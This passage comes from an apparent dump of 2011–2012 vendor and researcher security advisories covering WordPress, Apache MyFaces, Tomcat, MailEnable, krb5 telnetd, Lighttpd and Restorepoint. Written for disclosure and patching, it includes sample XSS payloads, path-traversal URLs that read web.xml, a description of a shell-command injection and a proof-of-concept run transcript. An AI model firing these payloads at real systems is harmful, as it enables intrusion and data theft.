> 1.9.2.10) Gecko/20100914 Firefox/3.6.10
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> Accept-Language: en-us,en;q=0.5
> Accept-Encoding: gzip,deflate
> Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
> Keep-Alive: 115
> Connection: keep-alive
> Content-Type: application/x-www-form-urlencoded; charset=UTF-8
> Content-Length: 219
> Cookie: wp-settings-1=m0%3Do%26m1%3Do%26m2%3Do%26m3%3Do%26m4%3Do%26m5%3Do
> %26m6%3Do%26m7%3Do%26m8%3Do%26urlbutton%3Dnone%26editor%3Dtinymce
> %26imgsize%3Dfull%26align%3Dcenter%26hidetb%3D1%26m9%3Dc%26m10%3Do
> %26uploader%3D1%26m11%3Do; wp-settings-time-1=1285758765;
> c o m m e n t _ a u t h o r _ 9 3 f 4 1 b a 0 b 1 6 f 3 4 6 7 6 f 8 0 2 0 5 8 e 8 2 3 8 8 f 6 = t e s t ;
> comment_author_email_93f41ba0b16f34676f802058e82388f6=rbranco_nospam
> %40checkpoint.com
> Pragma: no-cache
> Cache-Control: no-cache
> rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#
> $<script>alert(1)</script>$#$rbranco_nospam checkpoint com$#$http://
> www.checkpoint.com$#$<script>alert(1)</script>
>
>
>
> CREDITS
>
> This vulnerability has been brought to our attention by Wagner Elias from Conviso IT Security company (http://www.conviso.com.br) and researched internally by Rodrigo Rubira Branco from the Check Point Vulnerability Discovery Team (VDT).
>
>
>
>
> Best Regards,
>
> Rodrigo.
>
> --
> Rodrigo Rubira Branco
> Senior Security Researcher
> Vulnerability Discovery Team (VDT)
> Check Point Software Technologies
--
Kousuke Ebihara <kousuke co3k org>
http://co3k.org/"
10905,[SECURITY] CVE-2011-4367 Apache MyFaces information disclosure vulnerability,,CVE-2011-4367,"--------------------------------------------------------------------------------------------------
CVE-2011-4367: Apache MyFaces information disclosure vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
MyFaces Core 2.0.1 to 2.0.11
MyFaces Core 2.1.0 to 2.1.5
Earlier versions are not affected
Description:
MyFaces JavaServer Faces (JSF) allows relative paths in the
javax.faces.resource 'ln' parameter or writing the url so the resource
name include '..' sequences . An attacker could use the security
vulnerability to view files that they should not be able to.
Mitigation:
Users of affected versions should apply one of the following mitigations:
MyFaces Core 2.0.x users should update to 2.0.12
MyFaces Core 2.1.x users should update to 2.1.6
Example:
In linux or similar systems:
http://<hostname>:<port>/<context-root>/faces/javax.faces.resource/web.xml?ln=../WEB-INF
http://<hostname>:<port>/<context-root>/faces/javax.faces.resource/../WEB-INF/web.xml
or in windows systems:
http://<hostname>:<port>/<context-root>/faces/javax.faces.resource/web.xml?ln=..\WEB-INF
http://<hostname>:<port>/<context-root>/faces/javax.faces.resource/..\WEB-INF/web.xml
The 'ln' parameter should not allow a relative path. In the above example
the contents of the web.xml are displayed in the response to the attacker.
The part of the url that derive the resource name should not allow '..' as
valid char sequence.
Credit: Issue reported by Paul Nicolucci thanks to the security team at IBM
References:
--------------------------------------------------------------------------------------------------
regards,
Leonardo Uribe"
10926,CVE-2012-0803: Apache CXF does not validate UsernameToken policies correctly,,CVE-2012-0803,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2012-0803: Apache CXF does not validate UsernameToken policies correctly
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: Apache CXF 2.4.5 and 2.5.1
Description: CXF does not validate a WS-Security UsernameToken received as part
of the security header of a SOAP request against a WS-SP UsernameToken policy.
A malicious client could send a request to the endpoint with no UsernameToken,
and the UsernameToken policy requirement would still be marked as valid.
This has been fixed in revision:
http://svn.apache.org/viewvc?view=revision&revision=1233457
This issue was a regression in CXF 2.4.5 and 2.5.1. The vulnerability does not
exist in CXF 2.4.4 and 2.5.0.
Migration:
CXF 2.4.5 users should upgrade to 2.4.6 as soon as possible.
CXF 2.5.1 users should upgrade to 2.5.2 as soon as possible.
References: http://cxf.apache.org/security-advisories.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iQEcBAEBAgAGBQJPMAVXAAoJEGe/gLEK1TmD6y0H/2aP3A02qoFKeV0oYj7y8BCv
yPymkAilG6RLZK3kafZREnQ2jY/lCT0xXNP5n+0TYEu56WuS5tGzAeWpQc1TFmbi
Uq0YTv5RM3TZZ8lzThid+ean1qBU9LuIziQqKWP0QRpw+UipUHq68jTGkAOMePId
IbXnyogUy0si3jpI7BCnMsDOR8fGx9+t35D5jfcVf4aH+jFP1W4DhjeFbDhMlvSF
8Z4Pphvd7yi6x469dx0e46cGLaGi/BYyG3C2IrMOAmUXBcYB3g3skZN1nrY1t90n
IB12w03xishiAZVNs9FsfR3lAa84zX8z7+hrqb8Rlra1evhJBXQ/L583bmMmxKc=
=iU+M
-----END PGP SIGNATURE-----
--
Colm O hEigeartaigh
Talend Community Coder
http://coders.talend.com"
11030,[SECURITY] CVE-2012-0022 Apache Tomcat Denial of Service,,CVE-2012-0022,"CVE-2012-0022 Apache Tomcat Denial of Service
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.0 to 7.0.22
- Tomcat 6.0.0 to 6.0.33
- Tomcat 5.5.0 to 5.5.34
- Earlier, unsupported versions may also be affected
Description:
Analysis of the recent hash collision vulnerability identified unrelated
inefficiencies with Apache Tomcat's handling of large numbers of
parameters and parameter values. These inefficiencies could allow an
attacker, via a specially crafted request, to cause large amounts of CPU
to be used which in turn could create a denial of service.
The issue was addressed by modifying the Tomcat parameter handling code
to efficiently process large numbers of parameters and parameter values.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Tomcat 7.0.x users should upgrade to 7.0.23 or later
- Tomcat 6.0.x users should upgrade to 6.0.35 or later
- Tomcat 5.5.x users should upgrade to 5.5.35 or later
Credit:
The inefficiencies in handling large numbers of parameters were
identified by the Apache Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html"
11031,[SECURITY] CVE-2011-3375 Apache Tomcat Information disclosure,,CVE-2011-3375,"CVE-2011-3375 Apache Tomcat Information disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.0 to 7.0.21
- Tomcat 6.0.30 to 6.0.33
- Earlier versions are not affected
Description:
For performance reasons, information parsed from a request is often
cached in two places: the internal request object and the internal
processor object. These objects are not recycled at exactly the same time.
When certain errors occur that needed to be added to the access log, the
access logging process triggers the re-population of the request object
after it has been recycled. However, the request object was not recycled
before being used for the next request. That lead to information leakage
(e.g. remote IP address, HTTP headers) from the previous request to the
next request.
The issue was resolved be ensuring that the request and response objects
were recycled after being re-populated to generate the necessary access
log entries.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Tomcat 7.0.x users should upgrade to 7.0.22 or later
- Tomcat 6.0.x users should upgrade to 6.0.35 or later
Credit:
The issue was initially reported via Apache Tomcat's public issue
tracker with the potential security implications identified by the
Apache Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
https://issues.apache.org/bugzilla/show_bug.cgi?id=51872"
11051,ME020567: MailEnable webmail cross-site scripting vulnerability CVE-2012-0389,,CVE-2012-0389,"ME020567: MailEnable webmail cross-site scripting vulnerability (CWE-79)
References: CVE-2012-0389
Discovered by: Sajjad Pourali, Narendra Shinde and Shahab NamaziKhah
Vendor advisory: http://www.mailenable.com/kb/Content/Article.asp?ID=me020567
Vendor contact: 2012-01-04 09:49:36 UTC
Vendor response: 2012-01-04 10:27:13 UTC (Peter Fregon from MailEnable)
Vendor fix and announcement: 2012-01-10 00:50:31 UTC
Vulnerability description:
MailEnable <http://www.mailenable.com/> Professional and Enterprise versions are prone to cross-site scripting vulnerabilities as the user-supplied input received via ""Username"" parameter of ""ForgottonPassword.aspx"" page is not properly sanitized. A specially crafted URL which a user clicks could gain access to the users cookies for webmail or execute other malicious code in users browser in context of the domain in use.
Remote: yes
Authentication required: no
User interaction required: yes
Affected:
- MailEnable Professional, Enterprise & Premium 4.26 and earlier
- MailEnable Professional, Enterprise & Premium 5.52 and earlier
- MailEnable Professional, Enterprise & Premium 6.02 and earlier
Not affected:
- MailEnable Standard is not affected.
PoC:
http://example.com/mewebmail/Mondo/lang/sys/ForgottenPassword.aspx?Username='};alert(/XSS/);{'
Resolution:
Users of MailEnable 5 and 6 can resolve the issue by upgrading to version 5.53 or 6.03 or later. Alternatively, and for version 4 users, the following fix can be applied:
1) Open the ForgottenPassword.aspx file in Notepad. This file is in the Mail EnableinNETWebMailMondolang[language] folders in version 4 and in Mail EnableinNETWebMailMondolangsys in version 5 and 6.
2) Locate and remove the following line, then save the file: document.getElementById(""txtUsername"").value = '<%= Request.Item(""Username"") %>';
- Henri Salo"
11084,DDIVRT-2011-37 HP JetDirect Device Page Directory Traversal (CVE-2011-4785),,CVE-2011-4785,"Title: DDIVRT-2011-37 HP JetDirect Device Page Directory Traversal (CVE-2011-4785)
Severity: High
Date Discovered: 2011-10-12
Discovered By: Digital Defense, Inc. Vulnerability Research Team
Credited To: sxkeebler and r@b13$
Vulnerability Description:
The HP-ChaiSOE/1.0 embedded web server on certain HP JetDirect
printers allows a potential attacker to gain read only access to
directories and files outside of the web root, different from
CVE-2008-4419. An attacker can leverage this flaw to read arbitrary
system configuration files, cached documents, etc. Information
obtained from an affected host may facilitate further attacks against
the host. Exploitation of this flaw is trivial using common web server
directory traversal techniques.
Solution Description:
At this time, the vendor has been notified of the vulnerability and has
released a patch which addresses the issue for HP LaserJet P3015.
https://h20565.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03140700
Tested Systems / Software:
HP LaserJet 4650
Current Firmware: 20070419 07.006.0
HP LaserJet P3015
Current Firmware: 20100518 07.050.8 (Outdated)
HP LaserJet 2430
Current Firmware: 20090624 08.113.0_I35128
Vendor Name: HP
Vendor Website: http://www.hp.com/"
11134,SEC Consult SA-20111230-0 :: Critical authentication bypass in Microsoft ASP.NET Forms - CVE-2011-3416,,CVE-2011-3416,"SEC Consult Vulnerability Lab Security Advisory < 20111230-0 >
=======================================================================
title: Microsoft ASP.NET Forms Authentication Bypass
product: Microsoft .NET Framework
vulnerable version: Microsoft .NET Framework Version:4.0.30319;
ASP.NET Version:4.0.30319.237 and below
fixed version: MS11-100
CVE: CVE-2011-3416
impact: critical
homepage: http://www.microsoft.com/net
found: 2011-10-02
by: K. Gudinavicius / SEC Consult Vulnerability Lab
m. / SEC Consult Vulnerability Lab
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"".NET is an integral part of many applications running on Windows and
provides common functionality for those applications to run. This
download is for people who need .NET to run an application on their
computer. For developers, the .NET Framework provides a comprehensive
and consistent programming model for building applications that have
visually stunning user experiences and seamless and secure
communication.""
Source: http://www.microsoft.com/net
Vulnerability overview/description:
-----------------------------------
The null byte termination vulnerability exists in the
CopyStringToUnAlingnedBuffer() function of the webengine4.dll library
used by the .NET framework. The unicode string length is determined
using the lstrlenW function. The lstrlenW function returns the length
of the string, in characters not including the terminating null
character. If the unicode string containing a null byte is passed, its
length is incorrectly calculated, so only characters before the null
byte are copied into the buffer.
This vulnerability can be leveraged into an authentication bypass
vulnerability. Microsoft ASP.NET membership system depends on the
FormsAuthentication.SetAuthCookie(username, false) method for certain
functionality. By exploiting this vulnerability an attacker is able to
log on as a different existing user with all the privileges of the
targeted user (e.g. admin).
Proof of concept:
-----------------
Detailed exploit information and source code references have been
removed from this advisory.
An attacker is able to bypass authentication in certain functionality
using null bytes and log on as another user, e.g. admin.
Vulnerable / tested versions:
-----------------------------
The vulnerability has been verified to exist in Microsoft .NET Framework
Version:4.0.30319; ASP.NET Version:4.0.30319.237, which was the most
recent version at the time of discovery.
More information regarding affected versions is available within the
advisory of Microsoft:
http://technet.microsoft.com/en-us/security/bulletin/ms11-100
Vendor contact timeline:
------------------------
2011-10-07: Contacted vendor through secure microsoft com
2011-10-07: Vendor response, MSRC 11838
2011-10-14: Contacted MSRC asking for status
2011-10-15: Answer from case manager: the vulnerability will be
addressed through a security bulletin, a timeframe is
unknown.
2011-11-23: Contacted MSRC asking for status
2011-11-23: Answer from case manager: a release date of update is
unknown, best guess would be a month before or after the
March (2012) update cycle
2011-12-29: Microsoft publishes out-of-band security patch MS11-100
which also addresses this vulnerability
2011-12-30: SEC Consult releases redacted version of advisory due to
criticality of this issue
SEC Consult will release a more detailed advisory at a later date.
Solution:
---------
Immediately apply the MS11-100 patch:
http://technet.microsoft.com/en-us/security/bulletin/ms11-100
Workaround:
-----------
In .NET 4.0 the vulnerability can be mitigated by setting the
ticketCompatibilityMode attribute in the application or global
web.config file like this:
<system.web>
<authentication mode=""Forms"">
<forms ticketCompatibilityMode=""Framework40"" />
</authentication>
</system.web>
Advisory URL:
-------------
https://www.sec-consult.com/en/advisories.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Unternehmensberatung GmbH
Office Vienna
Mooslackengasse 17
A-1190 Vienna
Austria
Tel.: +43 / 1 / 890 30 43 - 0
Fax.: +43 / 1 / 890 30 43 - 25
Mail: research at sec-consult dot com
https://www.sec-consult.com
EOF K. Gudinavicius, J. Greil / @2011"
11150,MITKRB5-SA-2011-008 buffer overflow in telnetd [CVE-2011-4862],,CVE-2011-4862,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-008
MIT krb5 Security Advisory 2011-008
Original release: 2011-12-26
Last update: 2011-12-26
Topic: buffer overflow in telnetd
CVE-2011-4862
CVSSv2 Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C
CVSSv2 Base Score: 10
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 8.3
Exploitability: Functional
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
The telnet daemon (telnetd) in MIT krb5 (and in krb5-appl after the
applications were moved to a separate distribution for krb5-1.8) is
vulnerable to a buffer overflow. The flaw does not require
authentication to exploit. Exploit code is reported to be actively
used in the wild.
IMPACT
======
An unauthenticated remote attacker can cause a buffer overflow and
probably execute arbitrary code with the privileges of the telnet
daemon (normally root).
AFFECTED SOFTWARE
=================
* The telnet daemon in all releases of MIT krb5 prior to krb5-1.8 is
vulnerable. Later releases moved the telnet code to the krb5-appl
distribution.
* The telnet daemon in all releases of krb5-appl is vulnerable.
FIXES
=====
* Workaround: Disable telnet and use a more secure remote login
solution, such as SSH.
* A future release of krb5-appl will fix this vulnerability.
* Apply the following patch:
diff --git a/telnet/libtelnet/encrypt.c b/telnet/libtelnet/encrypt.c
index f75317d..b8d6cdd 100644
- --- a/telnet/libtelnet/encrypt.c
+++ b/telnet/libtelnet/encrypt.c
@@ -757,6 +757,9 @@ static void encrypt_keyid(kp, keyid, len)
int dir = kp->dir;
register int ret = 0;
+ if (len > MAXKEYLEN)
+ len = MAXKEYLEN;
+
if (!(ep = (*kp->getcrypt)(*kp->modep))) {
if (len == 0)
return;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-008-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-008-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-008.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2011-4862
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4862
http://lists.freebsd.org/pipermail/freebsd-security/2011-December/006117.html
ACKNOWLEDGMENTS
===============
We became aware of this vulnerability through a FreeBSD security
advisory.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
If the telnetd receives an ENCRYPT suboption that includes a key ID,
encrypt_keyid() in libtelnet/encrypt.c copies the suboption contents
into a fixed-size static buffer without first constraining the length,
leading to a buffer overflow.
REVISION HISTORY
================
2011-12-26 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk744dsACgkQSO8fWy4vZo6oOACdFW96Ei5AHXbXHBsHaax6tiEE
8AIAoJjMKx/2cbcLiTlHYiN3ypy8XF4S
=acqN
-----END PGP SIGNATURE-----"
11155,Lighttpd Proof of Concept code for CVE-2011-4362,,CVE-2011-4362,"29 of November 2011 was the date of public disclosure interesting
vulnerability in lighttpd server. Xi Wang discovered that mod_auth
for this server does not propely decode characters from the extended
ASCII table. The vulnerable code is below:
""src/http_auth.c:67""
--- CUT ---
static const short base64_reverse_table[256] = ...;
static unsigned char * base64_decode(buffer *out, const char *in) {
...
int ch, ...;
size_t i;
...

ch = in[i];
...
ch = base64_reverse_table[ch];
...
}
--- CUT ---
Because variable 'in' is type 'char', characters above 0x80 lead to negative indices.
This vulnerability may lead out-of-boud read and theoretically cause Segmentation Fault (Denial of Service attack).
Unfortunately I couldn't find any binaries where .rodata section before the base64_reverse_table
table cause this situation.
I have added some extra debug in the lighttpd source code to see if this vulnerability is
executed correctly. Here is output for one of the example:
--- CUT ---
ptr[0x9a92c48] size[0xc0] used[0x0]
127(. | 0 | 0)
-128(t | 1 | 0)
-127(e | 2 | 1)
-126(' | 3 | 2)
-125(e | 4 | 3)
-124(u | 5 | 3)
-123(r | 6 | 4)
-122(' | 7 | 5)
-121(s | 8 | 6)
-120(c | 9 | 6)
-119(i | 10 | 7)
-118(n | 11 | 8)
-117(i | 12 | 9)
-116( | 13 | 9)
-115(a | 14 | 10)
-114(t | 15 | 11)
-113(. | 16 | 12)
-112(e | 17 | 12)
-111(u | 18 | 13)
-110(r | 19 | 14)
-109(' | 20 | 15)
-108(f | 21 | 15)
-107(i | 22 | 16)
-106(e | 23 | 17)
-105(: | 24 | 18)
-104(= | 25 | 18)
-103(o | 26 | 19)
-102(t | 27 | 20)
-101(o | 28 | 21)
-100( | 29 | 21)
-99(a | 30 | 22)
-98(g | 31 | 23)
-97(. | 32 | 24)
-96(d | 33 | 24)
-95(g | 34 | 25)
-94(s | 35 | 26)
-93(: | 36 | 27)
-92(u | 37 | 27)
-91(s | 38 | 28)
-90(p | 39 | 29)
-89(o | 40 | 30)
-88(t | 41 | 30)
-87(d | 42 | 31)
-86(b | 43 | 32)
-85(c | 44 | 33)
-84(e | 45 | 33)
-83(d | 46 | 34)
-82(( | 47 | 35)
-81(n | 48 | 36)
-80(y | 49 | 36)
-79(h | 50 | 37)
-78(d | 51 | 38)
-77(g | 52 | 39)
-76(s | 53 | 39)
-75( | 54 | 40)
-74(r | 55 | 41)
-73(p | 56 | 42)
-72(a | 57 | 42)
-71(n | 58 | 43)
-70(. | 59 | 44)
-69(. | 60 | 45)
-68(d | 61 | 45)
-67(g | 62 | 46)
-66(s | 63 | 47)
-65(: | 64 | 48)
-64(( | 65 | 48)
-63(d | 66 | 49)
-62(- | 67 | 50)
-61(e | 68 | 51)
-60(s | 69 | 51)
-59( | 70 | 52)
-58(i | 71 | 53)
-57(s | 72 | 54)
-56(n | 73 | 54)
-55( | 74 | 55)
-54(i | 75 | 56)
-53(l | 76 | 57)
-52(. | 77 | 57)
-51(. | 78 | 58)
-50(k | 79 | 59)
-49(0 | 80 | 60)
-48(% | 81 | 60)
-47(] | 82 | 61)
-46(p | 83 | 62)
-45(r | 84 | 63)
-44(0 | 85 | 63)
-43(% | 86 | 64)
-42(] | 87 | 65)
-41(s | 88 | 66)
-40(z | 89 | 66)
-39([ | 90 | 67)
-38(x | 91 | 68)
-37(x | 92 | 69)
-36( | 93 | 69)
-35(s | 94 | 70)
-34(d | 95 | 71)
-33(0 | 96 | 72)
-32(% | 97 | 72)
-31(] | 98 | 73)
-30(. | 99 | 74)
-29(. | 100 | 75)
-28(d | 101 | 75)
-27(c | 102 | 76)
-26(d | 103 | 77)
-25(i | 104 | 78)
-24(g | 105 | 78)
-23(b | 106 | 79)
-22(s | 107 | 80)
-21(6 | 108 | 81)
-20(- | 109 | 81)
-19(t | 110 | 82)
-18(i | 111 | 83)
-17(g | 112 | 84)
-16(f | 113 | 84)
-15(i | 114 | 85)
-14(e | 115 | 86)
-13(. | 116 | 87)
-12(. | 117 | 87)
-11(. | 118 | 88)
-10(. | 119 | 89)
-9(. | 120 | 90)
-8(. | 121 | 90)
-7(. | 122 | 91)
-6(. | 123 | 92)
-5(. | 124 | 93)
-4(. | 125 | 93)
-3(. | 126 | 94)
-2(. | 127 | 95)
-1(. | 128 | 96)
k[0x60] ptr[0x9a92c48] size[0xc0] used[0x0]
ptr[0x9a92c48] size[0xc0] used[0x60]
string [.Yg....n.Xt.]r.ze.....g.Y....Yb.Y(..d..r.[..Y...-.xi..i.]
--- CUT ---
First column is the offset so vulnerability is executed like it should be
(negative offsets). Second column is byte which is read out-of-bound.
How to run this very primitive Proof of Concept?
$ gcc p_cve-2011-4362.c -o p_cve-2011-4362
$ ./p_cve-2011-4362
...::: -=[ Proof of Concept for CVE-2011-4362 (by Adam 'pi3' Zabrocki) ]=- :::...
Usage: ./p_cve-2011-4362 <options>
Options:
-v <victim>
-p <port>
-d <remote_dir_for_auth>
$ ./p_cve-2011-4362 -h 127.0.0.1 -p 81 -d dupa
...::: -=[ Proof of Concept for CVE-2011-4362 (by Adam 'pi3' Zabrocki) ]=- :::...
[+] Preparing arguments... OK
[+] Creating socket... OK
[+] Connecting to [127.0.0.1]... OK
[+] Sending dirty packet... OK
[+] Check the website!
$
Lighttpd will log this situation probably in error-log file like this:
--- CUT ---
..
..
2011-12-xx xx:xx:11: (http_auth.c.887) : is missing in �Yg���n�Xt�]rze����gY����Yb�Y(�d��r�[Y���-�xi��i�k�Wp� ]&#2038;�����@V��x���ize
--- CUT ---
Maybe you can find vulnerable binary?
Best regards,
Adam 'pi3' Zabrocki
--
http://pi3.com.pl
http://site.pi3.com.pl/exp/p_cve-2011-4362.c
http://blog.pi3.com.pl/?p=277"
11210,"VUPEN Security Research - Adobe Flash Player ""SAlign"" Memory Corruption Vulnerability (CVE-2011-2459)",,CVE-2011-2459,"VUPEN Security Research - Adobe Flash Player ""SAlign"" Memory Corruption Vulnerability (CVE-2011-2459)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Adobe Flash Player is a cross-platform browser-based application runtime
that delivers uncompromised viewing of expressive applications, content,
and videos across screens and browsers. Flash Player delivers breakthrough
web experiences to over 98% of Internet users.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a vulnerability in Adobe
Flash Player.
The vulnerability is caused by an uninitialized stack variable when
processing an invalid ""SAlign"" property of the Flash ActiveX control,
which could be exploited by remote attackers to compromise a vulnerable
system via a specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player versions prior to 11.1.102.55
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a proof-of-concept code
are available through the VUPEN Binary Analysis & Exploits portal :
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Upgrade to Adobe Flash Player version 11.1.102.55
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the world leader in vulnerability research for defensive and
offensive cyber security. VUPEN solutions enable corporations and governments
to measure and manage risks, eliminate vulnerabilities before they can be
exploited, and protect critical infrastructures and assets against known and
unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://www.adobe.com/support/security/bulletins/apsb11-28.html
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2011-01-27 - Vulnerability Discovered by VUPEN and shared with TPP customers
2011-12-16 - Public disclosure"
11242,[MATTA-2011-003] Restorepoint Remote root command execution vulnerability - CVE-2011-4201 CVE-2011-4202,,CVE-2011-4201,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Matta Consulting - Matta Advisory
https://www.trustmatta.com
Restorepoint Remote root command execution vulnerability
Advisory ID: MATTA-2011-003
CVE reference:
CVE-2011-4201 - Code injection vulnerability
CVE-2011-4202 - Privilege escalation through insecure file permissions
Affected platforms: Tadasoft Restorepoint
Version: 3.2-evaluation
Date: 2011-October-20
Security risk: Critical
Vulnerability: Remote root command execution
Researcher: Tavaris Desamito
Vendor Status: Notified, Patch available
Vulnerability Disclosure Policy:
https://www.trustmatta.com/advisories/matta-disclosure-policy-01.txt
Permanent URL:
https://www.trustmatta.com/advisories/MATTA-2011-003.txt
=====================================================================
Introduction:
Restorepoint is a network appliance backup and disaster recovery system
from Tadasoft.
More information can be found on the following page:
http://www.restorepoint.com/restorepoint/
=====================================================================
Vulnerability:
The 3.2 evaluation image of Restorepoint is vulnerable to a remote command
execution vulnerability in the remote_support.cgi script prior to license
activation. By supplying a semi colon followed by a unix shell command to
the pid1 or pid2 parameters in conjunction with the stop_remote_support
parameter, an unauthenticated remote attacker can execute commands on the
Restorepoint appliance with the privileges of the www user. The Common
Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2011-4201 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org), which standardizes names for security
problems.
Given that the Restorepoint appliance uses a Linux kernel compiled in
2009, obtaining root access is trivial.
Furthermore, Restorepoint uses sudo in order to run a number of scripts with
root access. As a large number of these scripts can be modified by the www
user, root access can be obtained directly through Restorepoint
functionality, without relying on additional exploits. The Common
Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2011-4202 to this issue.
=====================================================================
Impact:
Anyone who is able to connect to Restorepoint on port 443 between powering up
the appliance and before the appliance is license activated is able to obtain
root level shell access to the appliance.
The Restorepoint appliance is used to back up the configurations of network
devices and as such, the Restorepoint appliance holds credentials for all the
devices it backs up; Which in most cases will be privileged accounts that will
allow reconfiguration of the network devices.
If someone was able to compromise the security of the Restorepoint appliance
in the period between powering up the appliance and before the appliance is
license activated, an attacker is then able to go on to compromise the
security of all devices backed up by Restorepoint.
Having achieved this, an attacker may reposition and begin to compromise the
rest of the network by using the Restorepoint appliance to launch further
attacks.
=====================================================================
Versions affected:
Version 3.2 - evaluation image
The vendor reports that they maintain different trees for evaluation and
licensed copies of their software. The version available to licensed customers
is not vulnerable to this issue. Moreover, all appliances including
evaluations use a built-in auto-update mechanism upon license activation
that downloads additional software components and security updates which
ensures their customers are using the latest version of the product. The
vendor reports that the evaluation image would have been patched if the
evaluation license had been applied.
Matta have not confirmed this at this stage.
=====================================================================
Threat mitigation:
Anyone with evaluation versions of Restorepoint prior to 3.2 should activate
the license, at which point the software is automatically updated.
Matta suggests that affected parties running this version of the software
restrict access to port 443 on their Restorepoint appliances to only allow
trusted administrators to connect.
The vendor reports that the latest version available evaluation image
(3.3) is not vulnerable to this issue. Moreover, the vendor reports that
the 3.2 evaluation image would have been patched if an evaluation license
was applied.
In this case, Matta recommends that users activate their appliance to be
able to download the necessary software components and security updates.
=====================================================================
Credits
This vulnerability was discovered and researched by Tavaris Desamito from
Matta Consulting.
=====================================================================
History
20-10-11 initial discovery
24-10-11 initial attempt to contact the vendor
24-10-11 vendor response received and draft advisory supplied
25-10-11 vendor feedback received
14-11-11 advisory draft updated
... more interactions with the vendor
04-12-11 advisory draft updated
07-12-11 public disclosure
=====================================================================
About Matta
Matta is a privately held company with Headquarters in London, and a European
office in Amsterdam. Established in 2001, Matta operates in Europe, Asia,
the Middle East and North America using a respected team of senior
consultants. Matta is an accredited provider of Tiger Scheme training,
conducts regular research and is the developer behind the webcheck
application scanner, and colossus network scanner.
https://www.trustmatta.com
https://www.trustmatta.com/webapp_va.html
https://www.trustmatta.com/network_va.html
https://www.trustmatta.com/training.html
=====================================================================
Disclaimer and Copyright
Copyright (c) 2011 Matta Consulting Limited. All rights reserved.
This advisory may be distributed as long as its distribution is
free-of-charge and proper credit is given.
The information provided in this advisory is provided ""as is"" without
warranty of any kind. Matta Consulting disclaims all warranties, either
express or implied, including the warranties of merchantability and fitness
for a particular purpose. In no event shall Matta Consulting or its
suppliers be liable for any damages whatsoever including direct, indirect,
